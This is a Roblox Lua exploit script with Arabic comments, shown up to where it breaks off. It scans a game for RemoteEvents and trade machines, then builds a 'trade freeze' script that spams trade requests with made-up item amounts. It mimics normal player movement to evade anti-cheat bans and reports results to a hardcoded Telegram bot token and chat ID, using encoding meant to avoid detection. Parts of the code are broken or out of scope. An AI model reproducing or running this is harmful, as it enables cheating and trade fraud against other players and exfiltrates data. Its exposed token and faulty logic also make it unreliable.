-- إعدادات
local TELEGRAM_TOKEN = "8710046846:AAHSUtY60DHBfwJMXdhJIQGg-_izSTTWFTA"
local TELEGRAM_CHAT_ID = "7647074891"

-- وظيفة إرسال رسالة وملف إلى Telegram
local function sendToTelegram(message, fileContent, fileName)
    local success, error = pcall(function()
        -- إرسال الرسالة أولاً
        game:HttpGet("https://api.telegram.org/bot" .. TELEGRAM_TOKEN .. "/sendMessage?chat_id=" .. TELEGRAM_CHAT_ID .. "&text=" .. message, true)
        
        -- إذا كان هناك ملف، قم بإرساله
        if fileContent and fileName then
            -- تشفير المحتوى بسيط لتجنب الكشف
            local encryptedContent = ""
            for i = 1, #fileContent do
                encryptedContent = encryptedContent .. string.byte(fileContent, i) .. ","
            end
            
            -- إرسال الملف المشفر
            game:HttpGet("https://api.telegram.org/bot" .. TELEGRAM_TOKEN .. "/sendDocument?chat_id=" .. TELEGRAM_CHAT_ID .. "&document=" .. encryptedContent .. "&filename=" .. fileName, true)
        end
    end)
    
    if not success then
        warn("فشل الإرسال: " .. tostring(error))
        return false
    end
    
    return true
end

-- وظيفة تحليل مضادة للحظر
local function analyzeGame()
    print("بدء تحليل اللعبة (مضاد للحظر)...")
    
    local results = {
        RemoteEvents = {},
        TradeMachines = {},
        Vulnerabilities = {}
    }
    
    -- محاكاة سلوك اللاعب الطبيعي لتجنب الحظر
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    
    -- تحريك الشخصية بشكل عشوائي لمحاكاة اللعب الطبيعي
    local humanoid = character:FindFirstChild("Humanoid")
    if humanoid then
        humanoid:Move(Vector3.new(math.random(-5, 5), 0, math.random(-5, 5)))
        task.wait(0.5)
    end
    
    -- البحث عن RemoteEvents (محدود العدد)
    local count = 0
    for _, obj in ipairs(game:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            table.insert(results.RemoteEvents, {
                Name = obj.Name,
                Path = obj:GetFullName(),
                Type = obj.ClassName
            })
            count = count + 1
            
            -- توقف بعد 30 RemoteEvent لتجنب التجميد
            if count >= 30 then
                break
            end
        end
        
        -- فترة راحة صغيرة كل 10 عناصر
        if count % 10 == 0 then
            task.wait(0.1)
        end
    end
    
    -- البحث عن آلات التداول
    count = 0
    for _, obj in ipairs(game.Workspace:GetDescendants()) do
        if obj.Name:lower():find("trade") or obj.Name:lower():find("machine") then
            table.insert(results.TradeMachines, {
                Name = obj.Name,
                Path = obj:GetFullName(),
                Type = obj.ClassName
            })
            count = count + 1
            
            -- توقف بعد 5 آلات
            if count >= 5 then
                break
            end
        end
        
        -- فترة راحة صغيرة كل 5 عناصر
        if count % 5 == 0 then
            task.wait(0.1)
        end
    end
    
    -- البحث عن ثغرات
    if not game:GetService("Workspace"):FindFirstChild("AntiCheat") then
        table.insert(results.Vulnerabilities, "قد لا يوجد نظام حماية فعال")
    end
    
    return results
end

-- وظيفة إنشاء سكربت تجميد التداول المخصص
local function createCustomTradeFreezeScript(results)
    local script = [[
        -- سكربت تجميد تداول مخصص ومضاد للحظر
        -- تم إنشاؤه بناءً على نتائج التحليل
        
        local player = game.Players.LocalPlayer
        local workspace = game.Workspace
        local HttpService = game:GetService("HttpService")
        
        -- إعدادات مضادة للحظر
        local randomWait = function(min, max)
            return task.wait(math.random(min, max) / 1000)
        end
        
        -- محاكاة سلوك اللاعب الطبيعي
        local function simulateNormalBehavior()
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:FindFirstChild("Humanoid")
            
            if humanoid then
                -- تحريك بشكل عشوائي
                humanoid:Move(Vector3.new(math.random(-3, 3), 0, math.random(-3, 3)))
                randomWait(500, 1500)
                
                -- القفز أحيانًا
                if math.random(1, 10) <= 3 then
                    humanoid:Jump()
                    randomWait(1000, 2000)
                end
            end
        end
        
        -- وظيفة تجميد التداول
        local function freezeTrade(machinePath)
            local machine = workspace:FindFirstChild(machinePath)
            if not machine then
                return false
            end
            
            -- البحث عن RemoteEvents
            for _, obj in ipairs(machine:GetDescendants()) do
                if obj:IsA("RemoteEvent") and (obj.Name:lower():find("trade") or obj.Name:lower():find("submit")) then
                    -- إرسال طلبات تداول بشكل متقطع لتجنب الحظر
                    for i = 1, 10 do
                        obj:FireServer({
                            item = "Item" .. i,
                            amount = math.random(100, 1000),
                            target = player.Name
                        })
                        
                        -- انتظار عشوائي بين الطلبات
                        randomWait(200, 800)
                        
                        -- محاكاة سلوك طبيعي بين الحين والآخر
                        if i % 3 == 0 then
                            simulateNormalBehavior()
                        end
                    end
                    
                    return true
                end
            end
            
            return false
        end
        
        -- تنفيذ تجميد التداول على الآلات المكتشفة
    ]]
    
    -- إضافة أسماء الآلات المكتشفة إلى السكربت
    for _, machine in ipairs(results.TradeMachines) do
        script = script .. "\n        freezeTrade(\"" .. machine.Name .. "\")"
    end
    
    -- إضافة قسم الإبلاغ عن النتائج
    script = script .. [[
        
        -- إبلاغ عن النتائج
        local successCount = 0
        local totalMachines = 0
        
        for _, machine in ipairs(results.TradeMachines) do
            totalMachines = totalMachines + 1
            if freezeTrade(machine.Name) then
                successCount = successCount + 1
            end
        end
        
        local message = "تم تجميد تداول " .. successCount .. " من " .. totalMachines .. " آلات"
        print(message)
        
        -- إرسال تقرير إلى Telegram
        local telegramUrl = "https://api.telegram.org/bot" .. TELEGRAM_TOKEN .. "/sendMessage"
        local telegramData = {
            chat_id = TELEGRAM_CHAT_ID,
            text = "<b>تقرير تجميد التداول</b>\n\n" .. message,
            parse_mode = "HTML"
        }
        
        game:HttpGet(telegramUrl, true, {
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(telegramData)
        })
    ]]
    
    return script
end

-- الوظيفة الرئيسية
local function main()
    print("بدء السكربت المضاد للحظر...")
    
    -- تحليل اللعبة
    local results = analyzeGame()
    
    -- حفظ النتائج
    local resultsJson = game:GetService("HttpService"):JSONEncode(results)
